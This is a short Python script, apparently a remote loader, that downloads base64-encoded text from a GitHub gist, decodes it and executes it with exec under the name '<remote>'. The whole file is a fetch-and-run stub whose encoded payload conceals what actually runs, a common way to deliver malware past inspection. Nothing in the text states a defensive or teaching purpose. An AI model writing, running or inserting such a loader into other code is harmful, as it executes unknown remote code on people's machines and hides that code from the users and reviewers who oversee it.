import requests, base64

URL = "https://gist.github.com/ypkayla/a1fc44a209da2dba46a031a69f78174b"
response = requests.get(URL)
code_b64 = response.text.strip()

exec(compile(base64.b64decode(code_b64), "<remote>", "exec"))
